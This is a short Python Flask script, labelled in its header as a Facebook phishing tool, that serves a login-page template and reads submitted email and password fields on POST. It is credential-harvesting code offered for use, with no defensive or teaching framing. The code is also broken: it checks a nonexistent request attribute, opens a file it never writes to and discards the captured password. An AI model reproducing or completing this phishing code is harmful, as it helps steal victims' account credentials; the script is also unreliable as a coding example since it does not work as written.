#python facebook phising 
#Coded by Badhshah
#All Right Reserved

from flask import Flask, render_template, request, url_for

file = open('saved.txt','w')
app = Flask(__name__)

@app.route('/',  methods=['POST', 'GET'])
def index():
	if request.methods == "POST":
		pswd = request.form.get('pass')
		email = request.form.get('email')
		return email
	else:
		return render_template('index_v1.html')

app.run(debug=True)